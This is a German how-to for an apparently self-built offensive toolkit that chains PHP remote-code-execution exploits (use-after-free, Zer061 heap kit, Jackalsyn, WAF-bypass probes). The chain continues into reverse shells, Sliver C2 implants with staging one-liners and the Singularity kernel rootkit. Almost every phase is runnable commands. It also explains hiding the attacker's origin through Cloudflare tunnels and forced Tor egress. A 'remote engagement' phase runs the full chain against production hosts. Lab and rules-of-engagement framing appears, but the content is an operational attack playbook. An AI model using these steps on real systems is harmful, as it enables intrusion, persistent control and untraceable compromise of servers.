# How-To — PHP2Shell unchained (Menü & CLI)

## Einstieg

```bash
~/Schreibtisch/cursor-projects/php2shell-unchained
```

Ohne Argument öffnet `vtbw-php2shell-lab` ebenfalls das Menü.

Pfad im Menü: **[1]** dann **[2]** oder **[3]**, dann **[6]** Sliver C2 / **[7]** Singularity. Sec-Team: **[8]**.

---

## Phase 0 — Einmalige Vorbereitung

| Menü | CLI | Zweck |
|------|-----|--------|
| [2]→fetch Zer061 | `fetch-zer061` | Heap-Exploit Kit |
| [3]→fetch-jackalsyn | `fetch-jackalsyn` | Jackalsyn Framework + reup.zip |
| [6]→fetch Sliver | `fetch-sliver` | Sliver C2 (server+client) |
| [7]→fetch | `fetch-singularity` | Singularity LKM (Post-Exploit, optional) |
| [5]→Clone rs | `fetch-reverse-shell` | lukechilds-Payload (optional) |
| — | `docker compose --profile tools build attacker` | netcat für zer061-shell |

---

## Phase 1 — FPM-Lab (VTBW)

Menü **[1]**:

1. Target starten (`up`)
2. PoC UAF (`test`)
3. Chain-A `id` (`rce`)
4. Interaktive Shell (`shell`) — TTY nötig, `quit` zum Ende

Optional: `doctor`, `monitor`.

---

## Phase 2 — Zer061 mod_php

Menü **[2]**. Die Kit-Shell ist `zer061-shell`. Der lukechilds-Weg ist Menü **[5]**.

1. Apache Target (`apache-up`)
2. `fetch-zer061`
3. Proof (`zer061`) → `PROOF: uid=33(www-data)` in `third_party/zer061-php2shell/out/p1`
4. Reverse Shell (`zer061-shell`) — interaktiv

---

## Phase 3 — Jackalsyn

Menü **[3]** (Fetch ist einmalig und automatisch):

1. `fetch-jackalsyn`
2. Menü **[1]** → Target starten
3. `selftest` → `PASS`
4. `syms` (optional; Default-DTOR für PHP 8.4.4)
5. **`lab`** — automatisch: `--dtor` aus Cache / syms, FCGI an `target:9000`

Override: `JACKALSYN_DTOR=0x... jackalsyn lab`. Repro-Skripte: `third_party/jackalsyn-reup/`

---

## Phase 4 — Multi-Target

Menü **[4]**:

1. `apache-multi-up` (2× Apache)
2. `scan` / `fingerprint` / `exploit-list`
3. URLs: `targets/lab-targets.txt`

`DEEP=1 scan` nur per CLI.

---

## Phase 5 — reverse-shell.sh (lukechilds)

Menü **[5]** — nicht der Kit-Weg aus **[2]** (`zer061-shell`).

1. Terminal 1: `reverse-shell listen 4444`
2. Terminal 2: `apache-up` → `reverse-shell fetch` → `reverse-shell zer061`

Payload: `third_party/zer061-php2shell/out/r`

---

## Phase 6 — Sliver C2 (Post-Exploit)

Menü **[6]** — Adversary Emulation nach RCE. [BishopFox/sliver](https://github.com/bishopfox/sliver) (GPLv3).

```bash
vtbw-php2shell-lab fetch-sliver        # einmalig: server+client Binaries
vtbw-php2shell-lab sliver server-up    # Daemon (Compose-Profil sliver)
vtbw-php2shell-lab sliver operator     # einmalig: lab-Operator + client import
vtbw-php2shell-lab sliver listener     # mTLS 0.0.0.0:8888
vtbw-php2shell-lab sliver implant      # Linux amd64 Implant → out/sliver/
vtbw-php2shell-lab sliver stage        # HTTP-Staging + Paste-One-Liner für 'shell'
vtbw-php2shell-lab sliver console      # interaktive sliver-client Konsole
vtbw-php2shell-lab sliver ops          # ops.log
```

Externe C2-Sicht (Cloudflare Quick Tunnel, kein Account):

```bash
vtbw-php2shell-lab sliver http-listener   # HTTPS 8889
vtbw-php2shell-lab tunnel up sliver-http  # random trycloudflare URL → HTTPS-Implant-C2
vtbw-php2shell-lab tunnel up web          # externe Web-Sicht aufs Target
vtbw-php2shell-lab tunnel status          # URLs
```

### External-Attacker-Modus (kompletter Traffic über Tunnel, optional Tor)

Menü **[6]** → `external up [--tor]` orchestriert alles auf einmal: beide Tunnel
(web + sliver-http), Sliver-HTTPS-Listener, `out/external/state.env`:

```bash
vtbw-php2shell-lab external up          # Tunnel, direkter Egress
vtbw-php2shell-lab external up --tor    # + Tor: Tunnel-Aufbau UND Audit-Traffic via Tor-Exit
vtbw-php2shell-lab external status      # state.env + Tunnel/Tor
vtbw-php2shell-lab external patch-audit waf-bypass-top10   # Audit gegen Tunnel-URL (bei --tor via SOCKS5)
vtbw-php2shell-lab sliver implant-external   # HTTPS-C2-Implant → Tunnel-Host (Edge:443 → sliver:8889)
vtbw-php2shell-lab tor ip               # Beweis: Host-IP ≠ Tor-Exit-IP
vtbw-php2shell-lab external down --tor  # alles stoppen
```

**Ursprungs-Verschleierung — was gilt:**
- Ohne `--tor`: Opfer/Edge sieht externen Cloudflare-Traffic; **Cloudflare** sieht deine Host-Egress-IP (Tunnel-Aufbau geht direkt raus).
- Mit `--tor`: Tunnel-Sidecar hat **kein** direktes Egress-Interface — Default-Route zeigt erzwungen auf den Tor-Transit-Container (iptables-REDIRECT → TransPort, DNS via Tor DNSPort). Audit/Exploit-Requests laufen via `PATCH_AUDIT_PROXY=socks5h://vtbw-php2shell-tor:9050`. Cloudflare und Opfer sehen nur Tor-Exit-IPs.
- Sliver mTLS :8888 bleibt bewusst lab-intern; externer C2-Pfad ist ausschließlich HTTPS :8889 via Tunnel.
- Trade-off `--tor`: höhere Latenz; trycloudflare kann Exit-IPs gelegentlich drosseln → Tunnel-URL ggf. neu aufbauen (`tunnel up web --tor` erneut).

Alle Ops werden nach `out/sliver/ops.log`, `out/tunnel/ops.log`, `out/tor/ops.log` und `out/external/ops.log` geschrieben (UTC, greppbar).
Sliver-Details: Operator-Cfg heißt `lab_<lhost>.cfg`; Server-State liegt in `out/sliver/server-data` (mount auf `/root/.sliver`). Nach Container-Neuaufbau ohne dieses Volume: `sliver operator` erneut (Skript erkennt veraltete Config). rc-Skripte via `sliver-client --rc`; der Server-Container enthält die Go-Toolchain (Implant-Compile) und hat Egress (GOPROXY), die Targets bleiben intern.

---

## Phase 7 — Singularity (Post-Exploit)

Menü **[7]** — **nach** Shell/RCE, nur auf VM / Host / `singularity-lab` Container:

1. `fetch-singularity`
2. `singularity runtime` (container | host | vm)
3. Je nach Modus: `container-up` + `container-build` + `container-shell`, oder `host-check` + `host-build`, oder `vm-wizard` / `vm-up` (Stub)
4. Blue Team: `singularity detect`

Details: [docs/SINGULARITY-LAB.md](SINGULARITY-LAB.md)

---

## Phase 8 — Patch-Audit (Sec-Team)

Menü **[8]** — prüft, ob Emergency-Mitigations (Patch, WAF, `upload_progress` off, …) **noch bypassbar** sind:

```bash
PATCH_AUDIT_URL=http://127.0.0.1:19281/ vtbw-php2shell-lab patch-audit run all
vtbw-php2shell-lab patch-audit run waf-bypass-top10   # Top-10 WAF-Bypass-Probes
vtbw-php2shell-lab patch-audit logs                    # JSONL-Audit-Trail
```

Externer Lauf über den Tunnel (realistische Angreifer-Perspektive):

```bash
vtbw-php2shell-lab tunnel up web
PATCH_AUDIT_URL=$(vtbw-php2shell-lab tunnel url web)/index.php \
  vtbw-php2shell-lab patch-audit run waf-bypass-top10 vendor-patch
```

Komplett extern mit verschleiertem Ursprung (Tor-Egress, siehe Phase 6):

```bash
vtbw-php2shell-lab external up --tor
vtbw-php2shell-lab external patch-audit waf-bypass-top10   # URL+SOCKS5-Proxy automatisch
# oder manuell:
PATCH_AUDIT_URL=$(vtbw-php2shell-lab tunnel url web)/index.php \
PATCH_AUDIT_PROXY=socks5h://vtbw-php2shell-tor:9050 \
  vtbw-php2shell-lab patch-audit run waf-bypass-top10
```

Der Menüpunkt „UAF (destructive)“ setzt `PATCH_AUDIT_DESTRUCTIVE=1`.
Doku: [PATCH-BYPASS-AUDIT.md](PATCH-BYPASS-AUDIT.md). Nur **eigene** URLs / Lab.

---

## Phase E — Remote Engagement (Produktiv, RoE)

Menü **[e]** — dieselbe Vollkette **ohne** Docker-Target, gegen Hosts in `scope-authorized.txt`.

Wizard fragt: URL, LHOST, Tor, Sliver, RAAS (lukechilds, Default an), Quick Tunnel, Jackalsyn, Singularity-detect.

```bash
CONFIRM_ROE=I-AM-AUTHORIZED ENGAGE_LHOST=10.20.30.40 \
  vtbw-php2shell-lab engage run 'https://staging.example/index.php'

vtbw-php2shell-lab engage kits     # welche Unterprojekte wirklich da sind
```

Verdrahtung: [remote/README.md](../remote/README.md). Singularity wird aus engage **nicht** geladen (`insmod` bleibt VM-Lab, Menü [7]).

---

## Phase 9 — Docs & Tools

Menü **[9]**: `docs list` / `tools list` / `tools run …`

---

## Phase 10 — Docker

Menü **[d]**: `ps`, `logs target|apache|singularity|sliver|tunnel|tunnel-sliver|tor`, `tunnel status`, `external status`, `export`, `down` (inkl. Profile apache, multi, singularity, sliver, tools + tunnel/tunnel-sliver/stage/tor Container + external state).

---

## Portable Export

```bash
vtbw-php2shell-lab export
tar -xzf ~/Schreibtisch/cursor-projects/php2shell-lab-vtbw-portable-*.tar.gz -C ~/Schreibtisch
cd ~/Schreibtisch/php2shell-lab-vtbw-portable-*
./php2shell-unchained
```

Nach Entpacken wieder `fetch-zer061`, `fetch-jackalsyn`, optional `fetch-sliver` und `fetch-singularity`.

---

## Referenzen

- [docs/EXPLOIT-CHAIN-COMPARISON.md](EXPLOIT-CHAIN-COMPARISON.md)
- [docs/SINGULARITY-LAB.md](SINGULARITY-LAB.md)
- [docs/PATCH-BYPASS-AUDIT.md](PATCH-BYPASS-AUDIT.md)
- [third_party/README.md](../third_party/README.md)
- [README-PORTABLE.md](../README-PORTABLE.md)
